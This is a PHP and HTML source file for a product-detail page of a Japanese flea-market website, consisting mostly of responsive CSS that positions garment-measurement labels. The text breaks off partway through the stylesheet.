<?php
session_start();

if (!isset($_SESSION['Visitor_no'])  && ($_GET["cond"] != 'normal' || $_GET["cond"] == "")) {

    header("Location:Login.php?reurl=" . urlencode($_SERVER["REQUEST_URI"]));
}

require '../lib/api.php';
require '../lib/locale/ja.php';
$msg = "";
$e_msg = "";
$name = "";
$ename = "";
$pass = "";
$visitor_no =  isset($_SESSION['Visitor_no']) ? $_SESSION['Visitor_no'] : "0";
$username =  isset($_SESSION['Username']) ? $_SESSION['Username'] : "";
$unickname = "";

$imgsrc = "";
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta http-equiv="x-ua-compatible" content="ie=edge" />
    <meta name="viewport" content="width=device-width,
    initial-scale=1.0, minimum-scale=1.0" />

    <title>サイフル - ケアメンテで確かな仕上がりを約束する安心のフリマサイト</title>

    <meta name="keywords" content="apparel, catalog, clean, ecommerce, ecommerce HTML,
    electronics, fashion, html eCommerce, html store, minimal,
    multipurpose, multipurpose ecommerce, online store, responsive
    ecommerce template, shops" />
    <meta name="description" content="Best ecommerce html template for
    single and multi vendor store." />
    <meta name="author" content="ashishmaraviya" />

    <!-- site Favicon -->
    <link rel="icon" href="../assets/images/favicon/favicon.png" sizes="32x32" />
    <link rel="apple-touch-icon" href="../assets/images/favicon/favicon.png" />
    <meta name="msapplication-TileImage" content="../assets/images/favicon/favicon.png" />

    <!-- css Icon Font -->
    <link rel="stylesheet" href="../assets/css/vendor/ecicons.min.css" />

    <!-- css All Plugins Files -->
    <link rel="stylesheet" href="../assets/css/plugins/animate.css" />
    <link rel="stylesheet" href="../assets/css/plugins/swiper-bundle.min.css" />
    <link rel="stylesheet" href="../assets/css/plugins/jquery-ui.min.css" />
    <link rel="stylesheet" href="../assets/css/plugins/countdownTimer.css" />
    <link rel="stylesheet" href="../assets/css/plugins/slick.min.css" />
    <link rel="stylesheet" href="../assets/css/plugins/nouislider.css" />
    <link rel="stylesheet" href="../assets/css/plugins/bootstrap.css" />
    <link rel="stylesheet" href="../assets/fonts/font-awesome/css/font-awesome.min.css" />
    <!-- Main Style -->
    <link rel="stylesheet" href="../assets/css/style.css" />
    <link rel="stylesheet" href="../assets/css/responsive.css" />
    <link rel="stylesheet" href="../assets/css/common.css" />
    <link rel="stylesheet" href="../assets/css/top.css" />

    <link rel="stylesheet" href="../assets/css/ProductDetail.css" />
    <!-- Background css -->
    <link rel="stylesheet" id="bg-switcher-css" href="../assets/css/backgrounds/bg-4.css" />
    <script src="//kitchen.juicer.cc/?color=erYShRjbUok=" async></script>

    <style>
        html,
        body {
            overflow-x: hidden;
        }

        body {
            position: relative
        }

        .single-slide img {
            transform-origin: 45% 65%;
            transition: transform 1s, filter .5s ease-out;
            height: 400px;
            width: 370px;
            image-rendering: auto;
            image-rendering: crisp-edges;
            image-rendering: -webkit-optimize-contrast;
            opacity: 1;
            object-fit: contain;
            background-color: #DBDEE0;
        }

        table,
        th,
        td {
            border: 1px solid black;
            text-align: center;
        }

        table,
        th {
            width: 0px;

        }

        table {
            margin-top: -24px !important;
            font-weight: 700;
        }

        .size-table {
            font-size: 13px !important;
            border: none;
            margin-left: 26px;
        }

        a.wishlist .svg_img.pro_svg {
            height: 22px;
            width: 40px;
            margin-top: 8px;
        }
        @media screen and (max-width:767px) {
                a.wishlist .svg_img.pro_svg {
            
                width: 42px !important;
                margin-top: 10px !important;
            }

        }
        @media screen and (max-width:450px) {
            .size-table-detail {
                width: 100% !important;
            }

            .size-table {
                margin-left: 6px;
            }

        }

        @media screen and (max-width:1800px) and (min-width:820px) {
            .single-slide img {
                height: 400px;
                width: 450px !important;
            }

        }

        @media screen and (max-width:1400px) and (min-width:820px) {
            .single-slide img {
                height: 400px;
                width: 370px !important;
            }

        }

        @media screen and (max-width:2400px) and (min-width:820px) {
            .single-slide img {
                height: 400px;
                width: 470px !important;
            }
        }

        .single-slide:hover img {
            transform: scale(1.5);
        }

        #size {
            margin-left: 8px;
        }

        #imageDiv {
            /* display: flex;
            justify-content: center; */
            overflow-x: hidden;
            overflow-y: hidden;
            justify-content: center;
            white-space: nowrap;
        }

        #imageDiv img {
            margin-left: 5px;
            margin-right: 5px;
            width: 60px;
            height: 60px;
        }

        .previous {
            float: left;
            margin-top: -10%;
            margin-left: -24px;
        }

        .Next {
            float: right;
            margin-top: -10%;
        }

        .size-img-prod {
            width: 100%;
            height: 90%;
            position: relative;
        }

        #cmn_btn {
            width: 190px !important;
        }

        #buyerbtn2txt {
            width: 50% !important;
        }

        #sizeimagediv {
            position: relative;
            margin-bottom: -45px;
        }

        #pricetxthtml {
            color: #777;
            font-size: 15px;
        }

        .finishmeasurementvaluefront1 {
            position: absolute;
            left: 25.6%;
            bottom: 69.8%;
            font-size: 9px;
            font-weight: bold;
            color: black;
        }

        .finishmeasurementvaluefront1_1 {
            position: absolute;
            left: 29.8%;
            bottom: 68.4%;
            font-size: 13px;
            font-weight: bold;
            color: black;
            z-index: 1;
        }


        .finishmeasurementvaluefront2 {
            position: absolute;
            left: 38.2%;
            bottom: 71.4%;
            font-size: 9px;
            font-weight: bold;
            color: black;
        }

        .finishmeasurementvaluefront2_1 {
            position: absolute;
            left: 44.8%;
            bottom: 71.4%;
            font-size: 13px;
            font-weight: bold;
            color: black;
            z-index: 1;
        }


        .finishmeasurementvaluefront3 {
            position: absolute;
            left: 42.8%;
            bottom: 59.8%;
            font-size: 9px;
            font-weight: bold;
            color: black;
        }

        .finishmeasurementvaluefront3_1 {
            position: absolute;
            left: 50%;
            bottom: 58%;
            font-size: 13px;
            font-weight: bold;
            color: black;
            z-index: 1;
        }


        .finishmeasurementvaluefront4 {
            position: absolute;
            left: 25.6%;
            bottom: 59.6%;
            font-size: 9px;
            font-weight: bold;
            color: black;
        }

        .finishmeasurementvaluefront4_1 {
            position: absolute;
            left: 29.8%;
            bottom: 57%;
            font-size: 13px;
            font-weight: bold;
            color: black;
            z-index: 1;
        }

        .finishmeasurementvaluefront5 {
            position: absolute;
            left: 25.6%;
            bottom: 54.5%;
            font-size: 9px;
            font-weight: bold;
            color: black;
        }

        .finishmeasurementvaluefront5_1 {
            position: absolute;
            left: 29.8%;
            bottom: 51.9%;
            font-size: 13px;
            font-weight: bold;
            color: black;
            z-index: 1;
        }

        .finishmeasurementvaluefront6 {
            position: absolute;
            left: 25.8%;
            bottom: 46%;
            font-size: 9px;
            font-weight: bold;
            color: black;
        }

        .finishmeasurementvaluefront6_1 {
            position: absolute;
            left: 29.8%;
            bottom: 42.8%;
            font-size: 13px;
            font-weight: bold;
            color: black;
            z-index: 1;
        }

        .finishmeasurementvaluefront9 {
            position: absolute;
            left: 25.2%;
            bottom: 33.8%;
            font-size: 9px;
            font-weight: bold;
            color: black;
        }

        .finishmeasurementvaluefront9_1 {
            position: absolute;
            left: 29.4%;
            bottom: 29%;
            font-size: 13px;
            font-weight: bold;
            color: black;
            z-index: 1;
        }


        .finishmeasurementvaluefront12 {
            position: absolute;
            left: 25.6%;
            bottom: 22.7%;
            font-size: 9px;
            font-weight: bold;
            color: black;
        }

        .finishmeasurementvaluefront12_1 {
            position: absolute;
            left: 30.4%;
            bottom: 16.2%;
            font-size: 13px;
            font-weight: bold;
            color: black;
            z-index: 1;
        }

        .finishmeasurementvaluefront10 {
            position: absolute;
            left: 42.4%;
            bottom: 42.8%;
            font-size: 9px;
            font-weight: bold;
            color: black;
        }

        .finishmeasurementvaluefront10_1 {
            position: absolute;
            left: 50%;
            bottom: 39.2%;
            font-size: 13px;
            font-weight: bold;
            color: black;
            z-index: 1;
        }

        .finishmeasurementvaluefront11 {
            position: absolute;
            left: 42.2%;
            bottom: 34.2%;
            font-size: 9px;
            font-weight: bold;
            color: black;
        }

        .finishmeasurementvaluefront11_1 {
            position: absolute;
            left: 50%;
            bottom: 29.8%;
            font-size: 12px;
            font-weight: bold;
            color: black;
            z-index: 1;

        }

        @media screen and (min-width: 750px) {
            .finishmeasurementvaluefront8 {
                position: absolute;
                left: 14.6%;
                bottom: 44.6%;
                font-size: 9px;
                font-weight: bold;
                color: black;
            }
        }

        .finishmeasurementvaluefront8_1 {
            position: absolute;
            left: 16.2%;
            bottom: 42%;
            font-size: 13px;
            font-weight: bold;
            color: black;
            z-index: 1;
        }

        .finishmeasurementvaluefront7 {
            position: absolute;
            bottom: 53.4%;
            left: 8%;
            font-size: 9px;
            font-weight: bold;
            color: black;
        }

        .finishmeasurementvaluefront7_1 {
            position: absolute;
            bottom: 51%;
            left: 8.4%;
            font-size: 13px;
            font-weight: bold;
            color: black;
            z-index: 1;
        }

        .finishmeasurementvaluefront13 {
            position: absolute;
            left: 31.4%;
            bottom: 16.85%;
            font-size: 9px;
            font-weight: bold;
            color: black;
        }

        .finishmeasurementvaluefront13_1 {
            position: absolute;
            left: 37.4%;
            bottom: 20.8%;
            font-size: 13px;
            font-weight: bold;
            color: black;
            z-index: 1;
        }

        .finishmeasurementvaluefront14 {
            position: absolute;
            bottom: 49.4%;
            left: 15.2%;
            font-size: 9px;
            font-weight: bold;
            color: black;
        }

        .finishmeasurementvaluefront14_1 {
            position: absolute;
            bottom: 51.4%;
            left: 17%;
            font-size: 13px;
            font-weight: bold;
            color: black;
            z-index: 1;
        }

        .finishmeasurementvalueback15 {
            position: absolute;
            left: 70.6%;
            bottom: 73.6%;
            font-size: 9px;
            font-weight: bold;
            color: black;
        }

        .finishmeasurementvalueback15_1 {
            position: absolute;
            left: 83%;
            bottom: 72.8%;
            font-size: 13px;
            font-weight: bold;
            color: black;
            z-index: 1;
        }

        .finishmeasurementvalueback16 {
            position: absolute;
            left: 82.4%;
            bottom: 73.8%;
            font-size: 9px;
            font-weight: bold;
            color: black;
        }

        .finishmeasurementvalueback16_1 {
            position: absolute;
            left: 97.5%;
            bottom: 73%;
            font-size: 13px;
            font-weight: bold;
            color: black;
            z-index: 1;
        }

        .finishmeasurementvalueback17 {
            position: absolute;
            left: 70.2%;
            bottom: 67.2%;
            font-size: 9px;
            font-weight: bold;
            color: black;
        }

        .finishmeasurementvalueback17_1 {
            position: absolute;
            left: 82.8%;
            bottom: 66.8%;
            font-size: 13px;
            font-weight: bold;
            color: black;
            z-index: 1;
        }

        .finishmeasurementvalueback18 {
            position: absolute;
            bottom: 59.2%;
            left: 70.8%;
            font-size: 9px;
            font-weight: bold;
            color: black;
        }

        .finishmeasurementvalueback18_1 {
            position: absolute;
            bottom: 57%;
            left: 83.2%;
            font-size: 13px;
            font-weight: bold;
            color: black;
            z-index: 1;
        }

        .finishmeasurementvalueback19 {
            position: absolute;
            bottom: 54.5%;
            left: 70.2%;
            font-size: 9px;
            font-weight: bold;
            color: black;
        }

        .finishmeasurementvalueback19_1 {
            position: absolute;
            bottom: 51.8%;
            left: 82.8%;
            font-size: 13px;
            font-weight: bold;
            color: black;
            z-index: 1;
        }

        .finishmeasurementvalueback20 {
            position: absolute;
            bottom: 46.2%;
            left: 69.8%;
            font-size: 9px;
            font-weight: bold;
            color: black;
        }

        .finishmeasurementvalueback20_1 {
            position: absolute;
            bottom: 42.8%;
            left: 83.4%;
            font-size: 13px;
            font-weight: bold;
            color: black;
            z-index: 1;

        }

        .finishmeasurementvalueback27 {
            position: absolute;
            bottom: 40.8%;
            left: 70.2%;
            font-size: 9px;
            font-weight: bold;
            color: black;
        }

        .finishmeasurementvalueback27_1 {
            position: absolute;
            bottom: 36%;
            left: 83.2%;
            font-size: 13px;
            font-weight: bold;
            color: black;
            z-index: 1;
        }

        .finishmeasurementvalueback24 {
            position: absolute;
            bottom: 33.8%;
            left: 70.2%;
            font-size: 9px;
            font-weight: bold;
            color: black;
        }

        .finishmeasurementvalueback24_1 {
            position: absolute;
            bottom: 29%;
            left: 83.2%;
            font-size: 13px;
            font-weight: bold;
            color: black;
            z-index: 1;
        }

        .finishmeasurementvalueback25 {
            position: absolute;
            bottom: 22.8%;
            left: 70.2%;
            font-size: 9px;
            font-weight: bold;
            color: black;
        }

        .finishmeasurementvalueback25_1 {
            position: absolute;
            bottom: 17%;
            left: 83.4%;
            font-size: 13px;
            font-weight: bold;
            color: black;
            z-index: 1;
        }

        .finishmeasurementvalueback22 {
            position: absolute;
            bottom: 39.6%;
            left: 56.8%;
            font-size: 9px;
            font-weight: bold;
            color: black;
        }

        .finishmeasurementvalueback22_1 {
            position: absolute;
            bottom: 35.4%;
            left: 67.6%;
            font-size: 13px;
            font-weight: bold;
            color: black;
            z-index: 1;
        }

        .finishmeasurementvalueback26 {
            position: absolute;
            bottom: 13%;
            left: 75%;
            font-size: 9px;
            font-weight: bold;
            color: black;
        }

        .finishmeasurementvalueback26_1 {
            position: absolute;
            bottom: 6.4%;
            left: 89.9%;
            font-size: 13px;
            font-weight: bold;
            color: black;
            z-index: 1;
        }

        .finishmeasurementvalueback21 {
            position: absolute;
            left: 87%;
            bottom: 53.5%;
            font-size: 9px;
            font-weight: bold;
            color: black;
        }

        .finishmeasurementvalueback21_1 {
            position: absolute;
            left: 103.4%;
            bottom: 50.8%;
            font-size: 13px;
            font-weight: bold;
            color: black;
            z-index: 1;
        }

        .finishmeasurementvalueback28 {
            position: absolute;
            bottom: 37%;
            left: 74%;
            font-size: 9px;
            font-weight: bold;
            color: black;
        }

        .finishmeasurementvalueback28_1 {
            position: absolute;
            bottom: 32.4%;
            left: 88.4%;
            font-size: 13px;
            font-weight: bold;
            color: black;
            z-index: 1;
        }

        .finishmeasurementvalueback23 {
            position: absolute;
            bottom: 39.8%;
            left: 83.4%;
            font-size: 9px;
            font-weight: bold;
            color: black;
        }

        .finishmeasurementvalueback23_1 {
            position: absolute;
            bottom: 34.8%;
            left: 99.2%;
            font-size: 13px;
            font-weight: bold;
            color: black;
            z-index: 1;
        }

        .finishmeasurementvaluefront29 {
            position: absolute;
            bottom: 65.6%;
            left: 8.4%;
            font-size: 9px;
            font-weight: bold;
            color: black;
        }

        .finishmeasurementvaluefront29_1 {
            position: absolute;
            bottom: 63.8%;
            left: 9.8%;
            font-size: 13px;
            font-weight: bold;
            color: black;
            z-index: 1;
        }

        .finishmeasurementvaluedoublewidth {
            position: absolute;
            bottom: 12.6%;
            left: 32.4%;
            font-size: 9px;
            font-weight: bold;
            color: black;
        }

        .finishmeasurementvaluedoublewidth_1 {
            position: absolute;
            bottom: 5.8%;
            left: 37.4%;
            font-size: 13px;
            font-weight: bold;
            color: black;
            z-index: 1;
        }

        .ec-btn-group:hover {
            background-color: white !important;
        }

        .svg_img.pro_svg {
            fill: white;
        }


        @media screen and (min-width: 320px) and (max-width: 380px) {
            #checkoutbtn {
                padding-top: 15px !important;
            }

            .ec-vendor-card-body {
                padding: 15px !important;
            }

            .common_btn {
                padding-top: 14px !important;
            }

            #msgtxt {
                font-size: 15px;
            }

            #buyerbtn2txt {
                width: 70% !important;
            }
        }

        @media screen and (min-width: 380px) and (max-width: 400px) {
            .single-pro-content .ec-single-qty .ec-btn-group {
                margin-left: 50%;
            }

            .common_btn {
                padding-top: 14px !important;
            }

            #buyerbtn2txt {
                width: 70% !important;
            }
        }


        @media screen and (min-width:320px) and (max-width: 430px) {
            #buyerbtn2txt {
                width: 70% !important;
            }

            #checkoutbtn {

                width: 90% !important;
            }

            .size-img-prod {
                margin-left: 0%;
            }

            .common_btn {
                padding: 2px 48px 12px 24px;
            }

            .finishmeasurementvaluefront1 {
                left: 26.5% !important;
                bottom: 71% !important;
                font-size: 8px;
            }


            .finishmeasurementvaluefront2 {
                left: 38% !important;
                bottom: 73.4% !important;
                font-size: 8px;
            }


            .finishmeasurementvaluefront3 {
                left: 42% !important;
                bottom: 62% !important;
                font-size: 8px;
            }


            .finishmeasurementvaluefront4 {
                left: 26.5% !important;
                bottom: 60.9% !important;
                font-size: 8px !important;
            }

            .finishmeasurementvaluefront5 {
                left: 26% !important;
                bottom: 56.7% !important;
                font-size: 8px;
            }

            .finishmeasurementvaluefront6 {
                left: 26.5% !important;
                bottom: 48.4% !important;
                font-size: 8px !important;
            }

            .finishmeasurementvaluefront9 {
                left: 26.5% !important;
                bottom: 35.9% !important;
                font-size: 8px;
            }


            .finishmeasurementvaluefront12 {
                left: 26.5% !important;
                bottom: 24.7% !important;
                font-size: 8px !important;
            }

            .finishmeasurementvaluefront10 {
                left: 43% !important;
                bottom: 44.7% !important;
                font-size: 8px;
            }

            .finishmeasurementvaluefront11 {
                left: 42.5% !important;
                bottom: 36.5% !important;
                font-size: 8px;
            }

            .finishmeasurementvaluefront8 {
                left: 14.8% !important;
                bottom: 47.6% !important;
                font-size: 8px !important;
            }

            .finishmeasurementvaluefront7 {
                bottom: 55.6% !important;
                left: 8% !important;
                font-size: 8px !important;
            }

            .finishmeasurementvaluefront13 {
                left: 32% !important;
                bottom: 19% !important;
                font-size: 8px !important;
            }

            .finishmeasurementvaluefront14 {
                bottom: 52% !important;
                left: 15% !important;
                font-size: 8px;
            }

            .finishmeasurementvalueback15 {
                left: 69.5% !important;
                bottom: 75% !important;
                font-size: 8px;
            }

            .finishmeasurementvalueback16 {
                left: 80.6% !important;
                bottom: 75.9% !important;
                font-size: 8px;
            }

            .finishmeasurementvalueback17 {
                left: 69.4% !important;
                bottom: 69.8% !important;
                font-size: 8px !important;
            }

            .finishmeasurementvalueback18 {
                bottom: 60.9% !important;
                left: 69.8% !important;
                font-size: 8px;
            }

            .finishmeasurementvalueback19 {
                bottom: 56.5% !important;
                left: 69.8% !important;
                font-size: 8px;
            }

            .finishmeasurementvalueback20 {
                bottom: 48.2% !important;
                left: 70.2% !important;
                font-size: 8px;
            }

            .finishmeasurementvalueback27 {
                bottom: 42.9% !important;
                left: 69% !important;
                font-size: 8px;
            }

            .finishmeasurementvalueback24 {
                bottom: 35.8% !important;
                left: 70% !important;
                font-size: 8px;
            }

            .finishmeasurementvalueback25 {
                bottom: 24.8% !important;
                left: 69.6% !important;
                font-size: 8px;
            }

            .finishmeasurementvalueback22 {
                bottom: 41.4% !important;
                left: 57% !important;
                font-size: 8px;
            }

            .finishmeasurementvalueback26 {
                bottom: 14.8% !important;
                left: 75% !important;
                font-size: 8px;
            }

            .finishmeasurementvalueback21 {
                left: 86.8% !important;
                bottom: 55.5% !important;
                font-size: 8px;
            }

            .finishmeasurementvalueback23 {
                bottom: 41.8% !important;
                left: 81.9% !important;
                font-size: 8px;
            }

            .finishmeasurementvalueback28 {
                bottom: 38.8% !important;
                left: 73.4% !important;
                font-size: 8px;
            }

            .finishmeasurementvaluefront29 {
                bottom: 68.2% !important;
                left: 9.2% !important;
                font-size: 8px;
            }

            .finishmeasurementvaluedoublewidth {
                bottom: 14.8%;
                left: 32%;
                font-size: 8px;
            }

            .finishmeasurementvaluefront1_1 {
                left: 22.4% !important;
                bottom: 74.8% !important;
                font-size: 9px !important;
            }

            .finishmeasurementvaluefront2_1 {
                left: 36.8% !important;
                bottom: 74% !important;
                font-size: 9px !important;
            }

            .finishmeasurementvaluefront3_1 {
                left: 41% !important;
                bottom: 64.6% !important;
                font-size: 9px !important;
            }

            .finishmeasurementvaluefront4_1 {
                left: 22.4% !important;
                bottom: 64.2% !important;
                font-size: 9px !important;
            }

            .finishmeasurementvaluefront5_1 {
                left: 23.4% !important;
                bottom: 60% !important;
                font-size: 9px !important;
            }

            .finishmeasurementvaluefront6_1 {
                left: 22.9% !important;
                bottom: 52.6% !important;
                font-size: 9px !important;
            }

            .finishmeasurementvaluefront9_1 {
                left: 23.4% !important;
                bottom: 41.6% !important;
                font-size: 9px !important;
            }

            .finishmeasurementvaluefront12_1 {
                left: 23.8% !important;
                bottom: 31.8% !important;
                font-size: 9px !important;
            }

            .finishmeasurementvaluefront10_1 {
                left: 41.4% !important;
                bottom: 49.4% !important;
                font-size: 9px !important;
            }

            .finishmeasurementvaluefront11_1 {
                left: 41.2% !important;
                bottom: 57.9% !important;
                font-size: 9px !important;
            }

            .finishmeasurementvaluefront8_1 {
                left: 11.6% !important;
                bottom: 57.9% !important;
                font-size: 9px !important;
            }

            .finishmeasurementvaluefront7_1 {
                bottom: 59% !important;
                left: 4.2% !important;
                font-size: 9px !important;
            }

            .finishmeasurementvaluefront13_1 {
                left: 30% !important;
                bottom: 27.2% !important;
                font-size: 9px !important;
            }

            .finishmeasurementvaluefront14_1 {
                bottom: 55.9% !important;
                left: 14.6% !important;
                font-size: 9px !important;
            }

            .finishmeasurementvalueback15_1 {
                left: 70.8% !important;
                bottom: 75.2% !important;
                font-size: 9px !important;
            }

            .finishmeasurementvalueback16_1 {
                left: 84.2% !important;
                bottom: 74.99% !important;
                font-size: 9px !important;
            }

            .finishmeasurementvalueback17_1 {
                left: 71.4% !important;
                bottom: 71% !important;
                font-size: 9px !important;
            }

            .finishmeasurementvalueback18_1 {
                bottom: 63.4% !important;
                left: 71.4% !important;
                font-size: 9px !important;
            }

            .finishmeasurementvalueback19_1 {
                bottom: 59.6% !important;
                left: 70.8% !important;
                font-size: 9px !important;
            }

            .finishmeasurementvalueback20_1 {
                bottom: 53.3% !important;
                left: 70.4% !important;
                font-size: 9px !important;
            }

            .finishmeasurementvalueback27_1 {
                bottom: 48.2% !important;
                left: 69.4% !important;
                font-size: 9px !important;
            }

            .finishmeasurementvalueback24_1 {
                bottom: 42.6% !important;
                left: 70.8% !important;
                font-size: 9px !important;
            }

            .finishmeasurementvalueback25_1 {
                bottom: 33.8% !important;
                left: 70.6% !important;
                font-size: 9px !important;
            }

            .finishmeasurementvalueback22_1 {
                bottom: 46.6% !important;
                left: 56.6% !important;
                font-size: 9px !important;
            }

            .finishmeasurementvalueback26_1 {
                bottom: 25.8% !important;
                left: 76.3% !important;
                font-size: 9px !important;
            }

            .finishmeasurementvalueback21_1 {
                left: 88.6% !important;
                bottom: 64.8% !important;
                font-size: 9px !important;
            }

            .finishmeasurementvalueback23_1 {
                bottom: 44.2%;
                left: 85.5% !important;
                font-size: 9px !important;
            }

            .finishmeasurementvaluefront29_1 {
                bottom: 69.2% !important;
                left: 4.8% !important;
                font-size: 9px !important;
            }

            .finishmeasurementvaluedoublewidth_1 {
                bottom: 25.8%;
                left: 29.8%;
                font-size: 9px !important;
            }

            .finishmeasurementvaluefront8_1 {
                left: 10.6% !important;
                bottom: 51.9% !important;
                font-size: 9px !important;
            }

            #modal_img {
                width: 110%;
                height: 100%;
                image-rendering: -webkit-optimize-contrast;
                max-width: 130%;
                margin-left: -5%;
            }

            /* #cmn_btn {
                margin-bottom: 15%;
            } */
            .section-space-mt {
                margin-top: 134px !important;
            }

            #previous1 {
                margin-top: 193% !important;
                margin-left: 89%;
            }

            #Next1 {
                width: 25px;
                height: 25px;
                margin-top: 193% !important;
                margin-left: -72%;
            }

            #imageDiv {
                margin-left: 6%;
                margin-right: 6%;
            }

            .ec-vendor-card-body {
                padding: 15px !important;
            }

            #content_body {
                padding-bottom: 10% !important;
            }

            @media screen and (min-width: 360px) and (max-width: 390px) {
                .finishmeasurementvalueback23_1 {
                    bottom: 47.4% !important;
                    left: 85.5% !important;
                    font-size: 9px !important;
                }

                .finishmeasurementvalueback26_1 {
                    bottom: 25.6% !important;
                }

                .finishmeasurementvalueback25_1 {
                    bottom: 33.8% !important;
                }

                .finishmeasurementvalueback24_1 {
                    bottom: 42.6% !important;
                }

                .finishmeasurementvalueback27_1 {
                    bottom: 51.2% !important;
                }

                .finishmeasurementvalueback21_1 {
                    bottom: 59% !important;
                }

                .finishmeasurementvalueback19_1 {
                    bottom: 60.8% !important;
                }

                .finishmeasurementvaluefront10_1 {
                    left: 41.4% !important;
                    bottom: 50.4% !important;
                }

                .finishmeasurementvaluefront11_1 {
                    bottom: 43% !important;
                    font-size: 9px !important;
                }

                .finishmeasurementvaluefront12_1 {
                    bottom: 33.4% !important;
                }

                .finishmeasurementvaluefront9_1 {
                    left: 23.4% !important;
                    bottom: 42.6% !important;
                }

                .finishmeasurementvaluefront13_1 {
                    bottom: 28.2% !important;
                    font-size: 9px !important;
                }

                .finishmeasurementvaluefront14_1 {
                    left: 12.6% !important;
                }

                .finishmeasurementvalueback28 {
                    bottom: 39% !important;
                    left: 74.4% !important;
                    font-size: 7px;
                    z-index: 1;
                }

                .finishmeasurementvalueback28_1 {
                    bottom: 45% !important;
                    left: 75.4% !important;
                    font-size: 9px;
                    z-index: 1;
                }
            }
        }

        @media screen and (min-width:410px) and (max-width: 430px) {
            .finishmeasurementvaluefront4 {
                left: 26.5% !important;
                bottom: 60% !important;
            }

            .finishmeasurementvaluefront5 {
                left: 26.5% !important;
                bottom: 56.7% !important;
            }

            .finishmeasurementvaluefront6 {
                left: 26.5% !important;
                bottom: 48.4% !important;
            }

            .finishmeasurementvaluefront12 {
                left: 26.5% !important;
                bottom: 24.7% !important;
            }

            .finishmeasurementvaluefront13 {
                left: 32% !important;
                bottom: 19% !important;
            }

            .finishmeasurementvalueback17 {
                left: 69.8% !important;
                bottom: 69.4% !important;
            }

            .finishmeasurementvalueback23 {
                bottom: 41.8% !important;
                left: 83.2% !important;
            }

            .finishmeasurementvalueback24 {
                bottom: 35.8% !important;
                left: 70% !important;
            }

            .finishmeasurementvalueback26_1 {
                bottom: 23.8% !important;
                left: 74.3%;
            }

            .finishmeasurementvaluefront11_1 {
                bottom: 42.5% !important;
                font-size: 9px;
            }

            .finishmeasurementvalueback19_1 {
                bottom: 59.6% !important;
                left: 71.8% !important;
            }

            .finishmeasurementvalueback20_1 {
                bottom: 52% !important;
                left: 71% !important;
            }

            .finishmeasurementvalueback21_1 {
                left: 89.6% !important;
                bottom: 58.8% !important;

            }

            .finishmeasurementvalueback24_1 {
                bottom: 41.8% !important;
                left: 71.8% !important;
            }

            .finishmeasurementvalueback25_1 {
                bottom: 32.8% !important;
            }

            .finishmeasurementvalueback28_1 {
                bottom: 44.2%;
                left: 76%;
                font-size: 9px;
            }

            .finishmeasurementvalueback27_1 {
                bottom: 48.2% !important;
                left: 71.6% !important;
            }

            .finishmeasurementvaluefront8_1 {
                bottom: 51.6% !important;
                font-size: 8px;
                font-weight: bold;
            }

            .finishmeasurementvaluefront14_1 {
                bottom: 54.9% !important;
                left: 11.8% !important;
                font-size: 9px !important;
            }

            .finishmeasurementvaluefront12_1 {
                bottom: 32.8% !important;
            }


            .finishmeasurementvaluefront13_1 {
                bottom: 27.2% !important;
            }

            .finishmeasurementvaluefront3 {
                left: 42.4% !important;
                bottom: 61.8% !important;
            }

            .finishmeasurementvaluefront8 {
                left: 14.8% !important;
                bottom: 47.6% !important;
                font-size: 8px !important;
            }

            .finishmeasurementvalueback16 {
                left: 81.6% !important;
                bottom: 76.2% !important;
            }

            #footer {
                margin-top: -30% !important;
            }

            .common_btn {
                padding: 12px 48px 12px 24px;
            }

            .ec-vendor-card-body {
                padding: 15px !important;
            }

            #content_body {
                padding-bottom: 10% !important;
            }


        }

        @media screen and (min-width:430px) and (max-width: 460px) {
            .size-img-prod {
                margin-left: 13%;
            }

            .finishmeasurementvaluefront1 {
                left: 31.5% !important;
                bottom: 89.2% !important;
            }


            .finishmeasurementvaluefront2 {
                left: 41% !important;
                bottom: 91% !important;
            }


            .finishmeasurementvaluefront3 {
                left: 44% !important;
                bottom: 75.4% !important;
            }


            .finishmeasurementvaluefront4 {
                left: 31.5% !important;
                bottom: 71.9% !important;
            }

            .finishmeasurementvaluefront5 {
                left: 31.5% !important;
                bottom: 63.5% !important;
            }

            .finishmeasurementvaluefront6 {
                left: 31.5% !important;
                bottom: 52.4% !important;
            }

            .finishmeasurementvaluefront9 {
                left: 31.5% !important;
                bottom: 34.4% !important;
            }


            .finishmeasurementvaluefront12 {
                left: 31.5% !important;
                bottom: 17% !important;
            }

            .finishmeasurementvaluefront10 {
                left: 45% !important;
                bottom: 48.2% !important;
            }

            .finishmeasurementvaluefront11 {
                left: 44.5% !important;
                bottom: 33% !important;
            }

            .finishmeasurementvaluefront8 {
                left: 21.8% !important;
                bottom: 49.6% !important;
                font-size: 7px;
            }

            .finishmeasurementvaluefront7 {
                bottom: 64.2% !important;
                left: 17.2% !important;
            }

            .finishmeasurementvaluefront13 {
                left: 26% !important;
                bottom: 11% !important;
            }

            .finishmeasurementvaluefront14 {
                bottom: 58.1% !important;
                left: 23% !important;
            }

            .finishmeasurementvalueback15 {
                left: 63.5% !important;
                bottom: 93.8% !important;
            }

            .finishmeasurementvalueback16 {
                left: 71.9% !important;
                bottom: 92.9% !important;
            }

            .finishmeasurementvalueback17 {
                left: 62.8% !important;
                bottom: 82.8% !important;
            }

            .finishmeasurementvalueback18 {
                bottom: 70.9% !important;
                left: 63.2% !important;
            }

            .finishmeasurementvalueback19 {
                bottom: 64% !important;
                left: 62.8% !important;
            }

            .finishmeasurementvalueback20 {
                bottom: 52.4% !important;
                left: 63% !important;
            }

            .finishmeasurementvalueback27 {
                bottom: 42% !important;
                left: 63% !important;
            }

            .finishmeasurementvalueback24 {
                bottom: 31.8% !important;
                left: 63% !important;
            }

            .finishmeasurementvalueback25 {
                bottom: 19.4% !important;
                left: 62.9% !important;
            }

            .finishmeasurementvalueback22 {
                bottom: 43.6% !important;
                left: 52.5% !important;
            }

            .finishmeasurementvalueback26 {
                bottom: 9.2% !important;
                left: 66% !important;
            }

            .finishmeasurementvalueback21 {
                left: 76.2% !important;
                bottom: 61.2% !important;
            }

            .finishmeasurementvalueback23 {
                bottom: 35.5% !important;
                left: 74.5% !important;
            }

            .finishmeasurementvalueback28 {
                bottom: 37% !important;
                left: 65.9% !important;
            }

            .finishmeasurementvaluefront1_1 {
                left: 26.4%;
                bottom: 84.8%;
            }

            .finishmeasurementvaluefront2_1 {
                left: 40.8%;
                bottom: 86%;
            }

            .finishmeasurementvaluefront3_1 {
                left: 45%;
                bottom: 75%;
            }

            .finishmeasurementvaluefront4_1 {
                left: 26.8%;
                bottom: 73%;
            }

            .finishmeasurementvaluefront5_1 {
                left: 26.4%;
                bottom: 67%;
